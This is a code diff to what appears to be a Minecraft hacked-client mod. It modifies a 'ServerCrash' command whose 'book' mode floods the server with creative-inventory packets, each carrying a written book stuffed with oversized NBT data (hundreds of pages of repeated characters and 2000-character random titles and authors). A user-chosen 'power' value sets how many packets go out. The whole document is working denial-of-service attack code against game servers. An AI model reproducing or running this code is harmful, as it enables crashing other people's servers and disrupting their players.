@@ -33,7 +33,6 @@ import net.shadow.client.feature.gui.notifications.Notification;
 import java.util.Random;
 
 public class ServerCrash extends Command {
-
     final MinecraftClient client = MinecraftClient.getInstance();
 
     public ServerCrash() {
@@ -70,24 +69,25 @@ public class ServerCrash extends Command {
             }
 
             case "book" -> {
-                for (int real = 0; real < 50; real++) {
-                    for (int j = 0; j < 49; j++) {
-                        ItemStack crash = new ItemStack(Items.WRITTEN_BOOK, 1);
-                        NbtCompound tag = new NbtCompound();
-                        NbtList list = new NbtList();
-                        for (int i = 0; i < 300; i++) {
-                            list.add(NbtString.of("::::::::::".repeat(250)));
-                        }
-                        tag.put("author", NbtString.of(rndStr(2000)));
-                        tag.put("title", NbtString.of(rndStr(2000)));
-                        tag.put("pages", list);
-                        crash.setNbt(tag);
-                        if (j == 36 + client.player.getInventory().selectedSlot) {
-                            client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(5 + j, new ItemStack(Items.AIR, 1)));
-                            return;
-                        }
-                        client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(j, crash));
+                int size;
+                try {
+                    size = Integer.parseInt(args[1]);
+                } catch (Exception e) {
+                    Notification.create(2000, "Server Crash", Notification.Type.ERROR, "Please provide a power (around 5000 is good)");
+                    return;
+                }
+                for(int i = 0; i < size; i++){
+                    ItemStack crash = new ItemStack(Items.WRITTEN_BOOK, 1);
+                    NbtCompound tag = new NbtCompound();
+                    NbtList list = new NbtList();
+                    for (int j = 0; j < 300; j++) {
+                        list.add(NbtString.of("::::::::::".repeat(250)));
                     }
+                    tag.put("author", NbtString.of(rndStr(2000)));
+                    tag.put("title", NbtString.of(rndStr(2000)));
+                    tag.put("pages", list);
+                    crash.setNbt(tag);
+                    client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(25, crash));
                 }
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Book Crash");
             }
